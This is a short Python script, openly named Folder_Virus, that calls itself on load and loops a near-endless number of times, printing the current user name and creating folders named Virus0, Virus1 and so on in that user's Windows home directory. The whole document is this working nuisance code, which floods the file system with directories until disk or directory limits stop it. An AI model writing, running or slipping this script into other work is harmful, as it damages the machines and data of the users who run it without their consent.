def Folder_Virus():
    import os
    import getpass

    for i in range(1000000000000):

        dir = 'Virus' + str(i) + '\\'
        user = getpass.getuser()
        print(user)
        path = os.path.join("C:\\Users\\",str(user),dir)
        print(path)
        os.mkdir(path)

Folder_Virus()